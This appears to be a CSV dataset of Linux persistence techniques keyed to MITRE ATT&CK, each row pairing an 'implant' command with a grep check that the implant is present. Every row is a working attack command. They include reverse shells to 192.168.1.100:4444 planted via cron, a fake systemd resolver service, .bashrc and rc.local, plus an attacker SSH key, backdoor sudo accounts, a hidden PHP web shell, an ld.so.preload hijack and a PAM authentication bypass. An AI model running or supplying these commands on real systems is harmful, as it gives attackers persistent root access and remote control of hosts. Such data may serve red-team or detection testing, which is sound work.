Scenario_ID,MITRE_ATT&CK_ID,ATT&CK_Technique,攻击描述,Session_A_植入(Implant),Session_C_触发验证(Trigger),持久化类型
HC-T1053-003,T1053.003,Scheduled Task/Job: Cron,通过crontab植入Python反弹shell定时任务,"(crontab -l 2>/dev/null; echo ""*/15 * * * * /usr/bin/python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\\""192.168.1.100\\"",4444));subprocess.call([\\""bash\\"",\\""-i\\""],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"") | crontab -","crontab -l | grep -E 'python3.*socket.*4444'",Scheduled Task
HC-T1543-002,T1543.002,Create or Modify System Process: Systemd Service,创建伪装为系统解析服务的恶意systemd服务,"cat > /etc/systemd/system/dbus-org.freedesktop.resolve1.service << 'EOF'
[Unit]
Description=Network Name Resolution
After=network.target

[Service]
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; sleep 3600; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload && systemctl enable dbus-org.freedesktop.resolve1.service","systemctl is-enabled dbus-org.freedesktop.resolve1.service && cat /etc/systemd/system/dbus-org.freedesktop.resolve1.service | grep -E 'tcp.*4444'",System Service
HC-T1098-004,T1098.004,Account Manipulation: SSH Authorized Keys,向authorized_keys植入攻击者SSH公钥,"mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0fake... c2server@attacker' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys","cat /root/.ssh/authorized_keys | grep -E 'c2server'",Credential Access
HC-T1136-001,T1136.001,Create Account: Local Account,创建伪装为系统服务的后门账户并授予NOPASSWD sudo权限,"useradd -m -s /bin/bash -c 'System Service Account' sysupdate && echo 'sysupdate:B@ckd00r2024!' | chpasswd && usermod -aG sudo sysupdate && echo 'sysupdate ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/sysupdate","id sysupdate | grep -E '(sudo|wheel)' && grep sysupdate /etc/passwd && sudo -l -U sysupdate | grep NOPASSWD",Local Account
HC-T1546-004,T1546.004,Event Triggered Execution: Unix Shell Configuration Modification,通过.bashrc PROMPT_COMMAND植入反弹shell,"echo 'export PROMPT_COMMAND=""(nohup bash -c \""bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\"" &)""' >> /root/.bashrc","cat /root/.bashrc | grep -E 'PROMPT_COMMAND.*tcp.*4444'",Shell Configuration
HC-T1037-004,T1037.004,Boot or Logon Initialization Scripts: RC Scripts,修改/etc/rc.local植入开机启动后门,"echo '#!/bin/bash' > /etc/rc.local && echo 'nohup /usr/bin/python3 -c ""import socket,subprocess;s=socket.socket();s.connect((\\""192.168.1.100\\"",4444));subprocess.call([\\""bash\\"",\\""-i\\""],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())"" &' >> /etc/rc.local && chmod +x /etc/rc.local","cat /etc/rc.local | grep -E 'python3.*socket.*4444' && ls -la /etc/rc.local | grep -E '^-..x'",Boot Script
HC-T1505-003,T1505.003,Server Software Component: Web Shell,在Web目录植入隐藏PHP Web Shell,"echo '<?php if(isset($_REQUEST[""c""])){$c=$_REQUEST[""c""];@system($c."" 2>&1"");} ?>' > /var/www/html/.system.php","cat /var/www/html/.system.php | grep -E '\$_REQUEST.*system' && ls -la /var/www/html/.system.php",Web Shell
HC-T1574-006,T1574.006,Hijack Execution Flow: Dynamic Linker Hijacking,通过ld.so.preload植入隐藏共享库劫持,"echo '/usr/local/lib/libsystem.so' >> /etc/ld.so.preload && mkdir -p /usr/local/lib && touch /usr/local/lib/libsystem.so","cat /etc/ld.so.preload | grep -E 'libsystem.so' && ls -la /usr/local/lib/libsystem.so",Library Hijacking
HC-T1556-003,T1556.003,Modify Authentication Process: Pluggable Authentication Modules,修改PAM配置植入认证后门,"echo 'auth sufficient pam_permit.so' > /tmp/pam_backdoor && cat /etc/pam.d/sshd >> /tmp/pam_backdoor && cat /tmp/pam_backdoor > /etc/pam.d/sshd","head -1 /etc/pam.d/sshd | grep -E 'pam_permit.so'",Authentication Bypass
HC-T1078-003,T1078.003,Valid Accounts: Local Accounts,操控系统内置nobody账户激活并授予sudo权限,"usermod -s /bin/bash nobody && usermod -aG sudo nobody && echo 'nobody ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/nobody","grep nobody /etc/passwd | grep -E '/bin/bash' && sudo -l -U nobody | grep NOPASSWD",Account Manipulation
